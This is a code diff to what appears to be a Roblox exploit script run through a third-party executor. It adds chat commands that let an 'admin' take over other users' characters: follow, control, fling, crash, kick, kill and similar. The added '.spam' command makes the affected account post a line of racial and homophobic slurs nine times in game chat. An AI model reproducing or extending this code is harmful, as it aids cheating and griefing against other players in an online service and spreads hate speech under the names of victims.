@@ -1,3 +1,29 @@
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local PlayerModule = require(Player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
+local Controls = PlayerModule:GetControls()
+
+local function setControlsEnabled(enabled)
+    if enabled then
+        Controls:Enable() -- Enable player controls
+    else
+        Controls:Disable() -- Disable player controls
+    end
+end
+
+local function follow(onoff,pos)
+getgenv().flwwing = onoff
+while wait() do
+if getgenv().flwwing then
+setControlsEnabled(false)
+else
+setControlsEnabled(true)
+break
+end
+wait()
+game.Players.LocalPlayer.Character.Humanoid:MoveTo(pos)
+end
+end
 local function nameMatches(player, partialName)
     local nameLower = player.Name:lower()
     local displayNameLower = player.DisplayName:lower()
@@ -24,8 +50,10 @@ local commandsList = {
     ".rejoin", ".fast", ".normal", ".slow", ".unfloat", ".float",
     ".void", ".jump", ".trip", ".sit", ".freeze", ".unfreeze",
     ".kick", ".kill", ".bring", ".js", ".js2", ".invert", 
-    ".uninvert", ".spin", ".unspin", ".disablejump", ".unenablejump",
-    ".squeak", ".bighead", ".tiny", ".big", ".sillyhat"
+    ".uninvert", ".spin", ".unspin",
+    ".privland",
+    ".crash", ".smartwalktome", ".walktome", ".control", ".uncontrol", ".fling",
+    ".follow", ".unfollow", ".spam", ".warn", ".suspend", ".knock", ".scare"
 }
 
 local frozenPlayers = {}
@@ -465,7 +493,6 @@ local function getFloorHeight(position)
     end
     return position.Y
 end
-
 -- Main Control Loop
 RunService.RenderStepped:Connect(function(deltaTime)
     if not getgenv().controlling then return end
@@ -553,6 +580,20 @@ game.Workspace.DescendantAdded:Connect(enableSeat)
                 frozenPlayers = {}
             elseif command == ".kick" then
                 player:Kick("Kicked")
+            elseif command == ".follow" then
+            follow(true,admin.Character.HumanoidRootPart.Position)
+            elseif command == ".unfollow" then
+            follow(true,admin.Character.HumanoidRootPart.Position)
+            elseif command == ".spam" then
+            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
+            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
+            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
+            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
+            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
+            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
+            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
+            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
+            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
             elseif command == ".warn" then
 -- Gui to Lua
 -- Version: 3.2
